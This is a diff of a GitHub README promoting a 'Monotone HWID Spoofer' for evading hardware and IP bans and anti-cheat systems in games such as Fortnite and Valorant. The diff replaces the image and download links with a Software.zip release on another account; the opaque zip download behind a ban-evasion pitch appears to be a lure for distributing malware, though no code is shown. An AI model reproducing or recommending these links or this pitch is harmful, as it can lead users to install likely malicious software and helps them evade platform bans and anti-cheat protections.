@@ -1,6 +1,6 @@
 # Monotone HWID Spoofer
 
-![HWID Spoofer](https://image-url.com)
+![HWID Spoofer](https://github.com/zckbmelvergalarga/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
                                                 
 ## Description
 Welcome to the Monotone HWID Spoofer repository - your go-to solution for bypassing hardware or IP bans on various platforms. Our custom-created hardware ID spoofer is designed to help you overcome bans and restrictions in games like Fortnite and Valorant, as well as other online platforms. With our tool, you can change your HWID and avoid detection by anti-cheat systems, enabling you to continue playing without interruption.
@@ -14,7 +14,7 @@ Welcome to the Monotone HWID Spoofer repository - your go-to solution for bypass
 ## Installation
 To get started with the Monotone HWID Spoofer, simply download the software from the link below:
 
-[![Download Spoofer](https://img.shields.io/badge/Download-Spoofer-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Spoofer](https://github.com/zckbmelvergalarga/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)](https://github.com/zckbmelvergalarga/Monotone-HWID-Spoofer/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the software, launch the application and follow the on-screen instructions to spoof your HWID and bypass bans effectively.
 
